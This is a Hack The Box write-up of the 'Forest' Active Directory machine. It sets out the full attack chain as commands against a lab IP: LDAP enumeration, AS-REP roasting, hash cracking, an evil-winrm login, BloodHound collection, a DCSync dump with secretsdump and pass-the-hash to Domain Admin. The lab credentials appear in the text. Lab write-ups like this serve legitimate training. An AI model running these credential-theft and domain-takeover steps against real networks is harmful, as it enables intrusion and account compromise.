---
title: "Hack The Box - Forest - Writeup"
description: "Active Directory enumeration, AS-REP Roasting, BloodHound analysis, and DCSync exploitation on HackTheBox Forest."

platform: Hack The Box
image: "/images/forest.png"
difficulty: Easy
draft: false

tags:
  - HackTheBox
  - Windows
  - Active Directory
  - AS-REP Roasting
  - BloodHound
  - DCSync

categories:
  - HTB

ShowToc: true
TocOpen: true
ShowReadingTime: false
ShowBreadCrumbs: false
---

# Overview

Forest is a beginner-friendly Active Directory machine focused on LDAP enumeration, AS-REP Roasting, BloodHound privilege analysis, and DCSync abuse.

The machine demonstrates how weak Kerberos configurations and delegated Active Directory permissions can eventually lead to full domain compromise.

---

# Skills & Concepts

- LDAP Enumeration
- Kerberos Abuse
- AS-REP Roasting
- BloodHound Analysis
- ACL Abuse
- DCSync
- Pass-the-Hash
- Active Directory Privilege Escalation

---

# Tools Used

- Nmap
- ldapsearch
- Impacket
- Hashcat
- Evil-WinRM
- BloodHound

---

# Enumeration

## Nmap Scan

Initial scan:

```bash
nmap -sC -sV -oA nmap/initial 10.10.10.161
```

Results:

```text
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
```

The machine appeared to be a Domain Controller.

Important observations:

- Kerberos exposed
- LDAP available
- WinRM enabled
- SMB accessible

---

# LDAP Enumeration

Enumerating domain users:

```bash
ldapsearch -x -h 10.10.10.161 -b "DC=htb,DC=local"
```

Important account discovered:

```text
svc-alfresco
```

---

# AS-REP Roasting

Checking for users without Kerberos pre-authentication:

```bash
GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt -no-pass
```

Successful output:

```text
$krb5asrep$23$svc-alfresco@HTB.LOCAL:...
```

The account was vulnerable to AS-REP Roasting.

---

# Cracking the Hash

Using Hashcat:

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

Recovered credentials:

```text
svc-alfresco:s3rvice
```

---

# WinRM Access

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```

Successful authentication granted shell access.

---

# Privilege Escalation

## BloodHound Enumeration

Collecting BloodHound data:

```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -c all -ns 10.10.10.161
```

BloodHound analysis revealed dangerous delegated permissions involving:

- Exchange Windows Permissions
- Account Operators

These permissions eventually enabled DCSync abuse.

---

# DCSync Attack

Using Impacket:

```bash
secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161
```

Administrator hashes were successfully dumped.

---

# Administrator Access

Using Pass-the-Hash:

```bash
evil-winrm -i 10.10.10.161 -u Administrator -H HASH
```

This resulted in full Domain Administrator compromise.

---

# Attack Path Summary

```text
LDAP Enumeration
    ↓
AS-REP Roasting
    ↓
Hash Cracking
    ↓
WinRM Access
    ↓
BloodHound Analysis
    ↓
ACL Abuse
    ↓
DCSync
    ↓
Domain Administrator
```

---

# Lessons Learned

Forest is an excellent beginner Active Directory machine because it introduces:

- LDAP enumeration
- Kerberos abuse
- BloodHound analysis
- ACL privilege escalation
- DCSync attacks

while remaining approachable for newcomers to Active Directory exploitation.

It also reinforces the importance of delegated permissions and graph-based privilege escalation paths inside enterprise environments.